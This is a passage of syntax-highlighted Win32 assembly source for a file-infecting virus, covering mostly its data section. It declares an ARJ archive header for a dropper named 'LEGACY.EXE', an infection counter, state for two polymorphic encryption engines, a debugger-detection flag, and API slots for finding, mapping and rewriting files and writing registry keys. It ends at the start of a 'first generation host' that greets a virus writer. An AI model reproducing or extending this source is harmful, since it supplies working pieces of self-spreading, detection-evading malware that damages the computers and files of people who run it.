</span><span class="sc1">; --- ARJ Header</span><span class="sc0">

</span><span class="sc5">ARJHeader</span><span class="sc0">               </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">ARJSig</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">60h</span><span class="sc4">,</span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">ARJHeadsiz</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">2Ah</span><span class="sc0">
</span><span class="sc5">ARJHSmsize</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1Eh</span><span class="sc0">
</span><span class="sc5">ARJVer</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">07h</span><span class="sc0">
</span><span class="sc5">ARJMin</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">ARJHost</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">ARJFlags</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">ARJMethod</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">ARJFiletype</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">ARJReserved</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Z"</span><span class="sc0">
</span><span class="sc5">ARJFileTime</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">archive_mark</span><span class="sc0">
</span><span class="sc5">ARJFileDate</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc2">024h</span><span class="sc0">
</span><span class="sc5">ARJCompress</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ARJOriginal</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ARJCRC32</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ARJEntryName</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">ARJAttribute</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">ARJHostData</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">sARJHeader</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ARJHeader</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">ARJSecondSide</span><span class="sc0">           </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">ARJFilename</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"LEGACY.EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ARJComment</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">sARJCRC32Size</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ARJHSmsize</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">ARJHeaderCRC</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ARJExtended</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">

</span><span class="sc5">sARJSecondSide</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ARJSecondSide</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">sARJTotalSize</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ARJSig</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">ArchiveBuffer</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">50d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">OldBytes</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">pLIMIT</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">NewBytes</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">pLIMIT</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">K32_DLL</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"KERNEL32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">K32_Size</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">K32_DLL</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">kernel</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">user32</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">TmpModuleBase</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">TempGA_IT1</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">imagebase</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">ModBase</span><span class="sc0">
</span><span class="sc5">TempGA_IT2</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">infections</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">iobytes</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">NewSize</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">InfDropperSize</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ArchiveSize</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">NumBytesRead</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">SearchHandle</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">FileHandle</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">RegHandle</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">GlobalAllocHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">GlobalAllocHandle2</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">GlobalAllocHandle3</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MapHandle</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MapAddress</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">AddressTableVA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">NameTableVA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">OrdinalTableVA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">lpThreadId</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">Disposition</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">WFD_HndInMem</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">Counter</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">WFD_Handles_Count</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">SoftICE</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">; --- MMXE data</span><span class="sc0">

</span><span class="sc5">random_seed</span><span class="sc0">             </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">rnd_seed1</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">rnd_seed2</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">rnd_seed3</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">; Registers used (MMXE &amp; PHIRE)</span><span class="sc0">

</span><span class="sc5">@@reg_mask</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">@@reg_key</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">@@reg_counter</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">@@reg_ptr2data</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">@@reg_aux1</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">@@reg_delta</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">@@reg_aux2</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">@@mmx_ptr2data</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">@@mmx_key</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">@@init_mmx?</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">@@ptr_data2enc</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">@@ptr_buffer</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">@@size2enc</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">@@size2cryptd4</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">@@tmp_call</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">@@p_tmp_call</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">@@fix1</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">@@fix2</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">@@enc_key</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">@@l00paddress</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">@@size_address</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">@@ptrto2nd</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">@@flags</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">@@recursion</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">; --- PHIRE data</span><span class="sc0">

</span><span class="sc5">@@p_distance</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">@@p_buffer</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">; --- More virus data</span><span class="sc0">

</span><span class="sc5">@@Offsetz</span><span class="sc0">               </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">_FindFirstFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_FindNextFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_FindClose</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_CreateFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_DeleteFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_SetFilePointer</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_SetFileAttributesA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_CloseHandle</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetWindowsDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetSystemDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_CreateFileMappingA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_MapViewOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_UnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_SetEndOfFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetProcAddress</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_LoadLibraryA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetSystemTime</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_CreateThread</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_WaitForSingleObject</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_ExitThread</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetTickCount</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_FreeLibrary</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_WriteFile</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GlobalAlloc</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GlobalFree</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetFileSize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetFileAttributesA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_ReadFile</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetCurrentProcess</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_GetPriorityClass</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_SetPriorityClass</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">@@OffsetzUSER32</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">_FindWindowA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_PostMessageA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_MessageBoxA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">@@OffsetzADVAPI32</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">_RegCreateKeyExA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_RegSetValueExA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">MAX_PATH</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">260</span><span class="sc0">

</span><span class="sc5">FILETIME</span><span class="sc0">                </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">FT_dwLowDateTime</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FT_dwHighDateTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FILETIME</span><span class="sc0">                </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">WFD_dwFileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftCreationTime</span><span class="sc0">      </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastAccessTime</span><span class="sc0">    </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastWriteTime</span><span class="sc0">     </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved0</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved1</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_szFileName</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WFD_szAlternateFileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">TMP_szFileName</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">directories</span><span class="sc0">             </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">WindowsDir</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7Fh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">SystemDir</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7Fh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OriginDir</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7Fh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">dirs2inf</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">directories</span><span class="sc4">)/</span><span class="sc2">7Fh</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">mirrormirror</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">dirs2inf</span><span class="sc0">

</span><span class="sc5">SYSTEMTIME</span><span class="sc0">              </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">ST_wYear</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ST_wMonth</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ST_wDayOfWeek</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ST_wDay</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ST_wHour</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ST_wMinute</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ST_wSecond</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ST_wMilliseconds</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

        </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| 1st generation host                                                    ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Nadie combate la libertad. A lo m s, combate la libertad de los dem s. La</span><span class="sc0">
</span><span class="sc1">; libertad ha existido siempre, pero unas veces como privilegio de algunos,</span><span class="sc0">
</span><span class="sc1">; otras veces como derecho de todos. (Karl Marx)</span><span class="sc0">

</span><span class="sc5">fakehost</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">                             </span><span class="sc1">; Hiya Vecna! Cocaine rules!</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szMessage</span><span class="sc0">                </span><span class="sc1">; Even its 1st gen host! ;)</span><span class="sc0">
    </span><span class="sc9">IF</span><span class="sc0">      </span><span class="sc5">DEBUG</span><span class="sc0">
